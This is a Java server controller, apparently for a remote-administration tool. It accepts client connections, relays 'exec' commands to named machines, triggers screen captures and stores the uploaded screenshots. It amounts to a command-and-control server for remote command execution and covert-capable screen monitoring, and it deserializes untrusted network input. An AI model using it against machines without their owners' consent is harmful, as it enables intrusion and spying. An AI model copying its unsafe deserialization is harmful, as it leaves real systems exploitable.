package br.com.enviador.controller;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

import javax.swing.JFrame;

import br.com.enviador.model.Cliente;
import br.com.enviador.view.JanelaAdm;

public class ServidorController {

	public ArrayList<Cliente> listaDeClientes;
	public ServerSocket serverSocket;
	public ServerSocket serverCapturas;
	public static int contador = 0;
	public ServidorController() {

		this.listaDeClientes = new ArrayList<Cliente>();
	}

	public void iniciaServico() {
		Thread iniciando = new Thread(new Runnable() {
			public void run() {

				System.out.println("Servidor Iniciando...");
				int porta = 37389;
				System.out.println("Abrindo conexão na porta " + porta);
				try {

					serverSocket = new ServerSocket(porta, 10);
					System.out.println("Seridor Iniciado, aguardando conexões. ");
					Socket socketCliente;
					while (true) {
						socketCliente = serverSocket.accept();
						System.out.println("Nova conexão. Vamos processa-la.");
						processandoConexao(socketCliente);
					}

				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		});
		iniciando.start();

	}

	/**
	 * Esse método vai processar clientes que querem enviar uma imagem.
	 * 
	 * @param cliente
	 */
	public void receberCaptura(final Socket cliente) {
		Thread recebendo = new Thread(new Runnable() {

			@Override
			public void run() {

				try {

					File f1 = new File("C:\\captura_"+contador+".JPEG");
					contador++;
					FileOutputStream out = new FileOutputStream(f1);
					InputStream in = cliente.getInputStream();
					int tamanho = 4096;
		            byte[] buffer = new byte[tamanho];
		            
					int lidos = -1;
					while ((lidos = in.read(buffer, 0, tamanho)) != -1) {
						out.write(buffer, 0, lidos);
					}
					out.flush();
					out.close();
					cliente.close();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

			}
		});
		recebendo.start();

	}

	public void iniciaServicoCaptura() {
		Thread iniciando = new Thread(new Runnable() {
			public void run() {

				System.out.println("Servidor de capturas...");
				int porta = 12345;
				System.out.println("Abrindo conexão na porta " + porta);
				try {

					serverCapturas = new ServerSocket(porta, 10);
					System.out.println("Capturas iniciado, aguardando conexões. ");
					Socket socketCliente;
					while (true) {
						socketCliente = serverCapturas.accept();
						System.out.println("Aceitei um");
						receberCaptura(socketCliente);
					}

				} catch (IOException e) {

					e.printStackTrace();
				}
			}
		});
		iniciando.start();

	}

	public void processandoConexao(final Socket socketCliente) {
		Thread processando = new Thread(new Runnable() {

			@Override
			public void run() {

				Cliente cliente = new Cliente();
				cliente.setConexao(socketCliente);
				listaDeClientes.add(cliente);

				try {
					ObjectOutputStream saida = new ObjectOutputStream(socketCliente.getOutputStream());
					cliente.setSaida(saida);
					ObjectInputStream entrada = new ObjectInputStream(socketCliente.getInputStream());
					cliente.setEntrada(entrada);

					while (true) {
						try {
							String mensagem = (String) entrada.readObject();
							processandoMensagens(mensagem, cliente);

						} catch (ClassNotFoundException e) {

							System.out.println("Erro maluco, cliente desconectado. ");
							cliente.getConexao().close();
							listaDeClientes.remove(cliente);
							break;
						}

					}
				} catch (IOException e) {
					System.out.println("Erro maluco, cliente desconectado. ");
					try {
						cliente.getConexao().close();
					} catch (IOException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
					listaDeClientes.remove(cliente);

				}
				listaDeClientes.remove(cliente);
			}
		});
		processando.start();

	}

	public void processandoMensagens(final String mensagem, final Cliente cliente) {
		Thread processandoMensagem = new Thread(new Runnable() {

			@Override
			public void run() {
				if (mensagem.contains("setNome") && mensagem.length() >= "setNome".length() + 2) {
					cliente.setNome(mensagem.substring("setNome(".length(), mensagem.length() - 1));
					System.out.println("Novo nome �: " + cliente.getNome());
				}

				System.out.println(cliente.getNome() + ">>" + mensagem);
			}
		});

		processandoMensagem.start();

	}

	public void iniciaAdministrador() {
		System.out.println("Era pra abrir aqui.");

		final JanelaAdm janela = new JanelaAdm();
		janela.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		janela.getBtnEnviar().addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String comando = janela.getTextField().getText();
				janela.getTextField().setText("");

				System.out.println(comando);
				processaMensagemAdm(comando);

			}
		});
		janela.setVisible(true);

	}

	public void processaMensagemAdm(String mensagem) {

		if (mensagem.equals("listar")) {
			System.out.println("Lista de clientes");
			for (Cliente cliente : listaDeClientes) {
				System.out.println(cliente.getNome());
			}
			return;
		}

		if (mensagem.indexOf('(') == -1 || mensagem.indexOf(')') == -1) {
			System.out.println("Mensagem não encontrada. Digite ajuda para obter ajuda. ");
			return;
		}

		String parametros = "";
		String comando = mensagem.substring(0, mensagem.indexOf('('));
		parametros = mensagem.substring((mensagem.indexOf('(') + 1), mensagem.indexOf(')'));

		if (mensagem.equals("testeJanelinha")) {
			System.out.println("Janelinha em todos");
			for (Cliente cliente : listaDeClientes) {
				try {
					cliente.getSaida().writeObject("abreJanelinha");
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}

		} else if (comando.equals("exec")) {

			String nomeDaMaquina = parametros.substring(0, parametros.indexOf(','));
			String strCmd = parametros.substring(parametros.indexOf(',') + 1);

			nomeDaMaquina = nomeDaMaquina.trim();
			strCmd = strCmd.trim();
			for (Cliente cliente : listaDeClientes) {
				if (cliente.getNome().trim().toLowerCase().equals(nomeDaMaquina.toLowerCase())) {
					try {
						cliente.getSaida().writeObject("exec(" + strCmd + ")");
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

				}

			}

		} else if (comando.equals("capturar")) {
			String nome = parametros.toLowerCase().trim();

			for (Cliente cliente : listaDeClientes) {
				if (cliente.getNome().trim().toLowerCase().equals(nome)) {
					try {
						cliente.getSaida().writeObject("capturar()");
					} catch (IOException e) {

						e.printStackTrace();
					}
				}
			}
		}

		else {

			System.out.println("Comando desconhecido");

		}
	}

}
